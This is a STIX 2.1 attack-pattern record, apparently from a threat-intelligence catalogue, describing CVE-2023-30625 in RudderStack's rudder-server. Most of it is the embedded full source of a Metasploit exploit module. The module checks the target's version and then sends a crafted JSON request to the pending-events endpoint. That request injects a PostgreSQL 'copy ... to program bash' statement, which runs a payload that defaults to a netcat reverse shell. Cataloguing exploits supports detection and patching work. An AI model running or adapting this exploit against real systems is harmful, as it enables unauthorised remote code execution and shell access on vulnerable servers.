{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e2817b3e-60bc-4568-848b-3da6de8e8f76",
    "created": "2024-08-14T17:11:00.755862Z",
    "modified": "2024-08-14T17:11:00.755866Z",
    "name": "Rudder Server SQLI Remote Code Execution",
    "description": " This Metasploit module exploits a SQL injection vulnerability in RudderStack's rudder-server, an open source Customer Data Platform (CDP). The vulnerability exists in versions of rudder-server prior to 1.3.0-rc.1. By exploiting this flaw, an attacker can execute arbitrary SQL commands which may lead to Remote Code Execution (RCE) due to the `rudder` role in PostgreSQL having superuser permissions by default.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/rudder_server_sqli_rce.rb",
            "external_id": "rudder_server_sqli_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-30625"
        },
        {
            "source_name": "reference",
            "url": "https://securitylab.github.com/advisories/GHSL-2022-097_rudder-server/"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30625"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Rudder Server SQLI Remote Code Execution',\n        'Description' => %q{\n          This Metasploit module exploits a SQL injection vulnerability in\n          RudderStack's rudder-server, an open source Customer Data Platform (CDP).\n          The vulnerability exists in versions of rudder-server prior to 1.3.0-rc.1.\n          By exploiting this flaw, an attacker can execute arbitrary SQL commands,\n          which may lead to Remote Code Execution (RCE) due to the `rudder` role\n          in PostgreSQL having superuser permissions by default.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ege Balc\u0131 <egebalci@pm.me>' # msf module\n        ],\n        'References' => [\n          ['CVE', '2023-30625'],\n          ['URL', 'https://securitylab.github.com/advisories/GHSL-2022-097_rudder-server/'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-30625'],\n        ],\n        'DefaultOptions' => {\n          'SSL' => false,\n          'WfsDelay' => 5\n        },\n        'Platform' => [ 'unix', 'linux' ],\n        'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => %w[unix linux],\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat'\n              }\n            }\n          ],\n          # Due to the insufficient build instructions for Windows platforms, no testing were done on this platform.\n          # As a result, the target is disabled in this exploit module.\n          # [\n          #   'Windows Command',\n          #   {\n          #     'Platform' => 'win',\n          #     'Arch' => ARCH_CMD,\n          #     'Type' => :win_cmd,\n          #     'DefaultOptions' => {\n          #       'PAYLOAD' => 'cmd/windows/powershell_reverse_netcat'\n          #     }\n          #   }\n          # ],\n        ],\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'DisclosureDate' => '2023-06-16',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'The URI of the Rudder API', '/']),\n      ]\n    )\n  end\n\n  def check\n    version = get_version\n    return Exploit::CheckCode::Unknown if version.nil? || version == 'Unknown'\n\n    if Rex::Version.new('1.3.0-rc.1') > Rex::Version.new(version.gsub('v', ''))\n      return Exploit::CheckCode::Appears(\"Rudder Version: #{version}\")\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_version\n    return @get_version if @get_version\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'version')\n    )\n    if res && res.code == 200\n      @get_version = res.get_json_document['Version']\n      if @get_version.empty?\n        @get_version = 'Unknown'\n      end\n\n      @get_version\n    end\n  end\n\n  def exploit\n    print_status \"Detected rudder version: #{get_version}\"\n    # If not 'Auto' then use the selected version\n    case target['Type']\n    # when :win_cmd\n    #   shell = 'cmd.exe'\n    when :unix_cmd\n      shell = 'bash'\n    else\n      fail_with(Failure::BadConfig, 'Please select a valid target')\n    end\n\n    data = \"{\\\"source_id\\\": \\\"#{Rex::Text.rand_text_alpha(4..8)}'; copy (SELECT '#{payload.encoded}') to program '#{shell}'-- - \\\"}\"\n    print_status 'Triggering RCE via crafted SQL query...'\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/v1/warehouse/pending-events'),\n      'ctype' => 'application/json',\n      'data' => data\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-06-16",
    "x_mitre_platforms": [
        "%w[unix linux]"
    ]
}